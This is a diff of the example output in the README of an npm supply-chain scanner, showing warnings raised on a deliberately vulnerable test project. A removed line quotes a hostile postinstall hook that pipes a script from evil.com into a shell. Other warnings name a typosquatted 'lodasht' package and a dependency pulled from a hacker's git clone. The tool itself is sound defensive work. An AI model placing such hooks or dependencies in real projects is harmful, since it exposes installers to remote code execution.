@@ -108,17 +108,18 @@ EXAMPLE OUTPUT
 
 > npm-supply-chain-guard .
 
-🔍 Scanning project: /my-app
+PS C:\Users\acer\Desktop\npm-supply-chain-guard\test-vulnerable-project> node ../src/index.js .
+🔍 Scanning: C:\Users\acer\Desktop\npm-supply-chain-guard\test-vulnerable-project
 
-⚠ [1] Risky lifecycle script: postinstall -> curl http://evil.com/install.sh | sh
-⚠ [2] Suspicious command in script "postinstall": downloads external content with curl
-⚠ [3] Unsafe version tag: lodash@latest
-⚠ [4] Wide version range detected: express@^4.18.2
-⚠ [5] Dependency has install script: node_modules/badpkg
+⚠ [1] [MEDIUM] Risky lifecycle script: postinstall
+⚠ [2] [HIGH] Suspicious command in "postinstall": downloads external content with curl
+⚠ [3] [MEDIUM] Suspicious command in "postinstall": contains remote URL
+⚠ [4] [LOW] Wide version range detected: lodasht@^4.0.0
+⚠ [5] [HIGH] High Risk: "lodasht" looks like a typosquatting attempt of "lodash"
+⚠ [6] [MEDIUM] Unsafe version tag: express@latest
+⚠ [7] [HIGH] Suspicious dependency source: react@git+https://github.com/hacker/react-clone.git
 
-⚠ Total warnings: 5
-
-✅ Scan complete
+Total Warnings: 7
 
 --------------------------------------------------
 
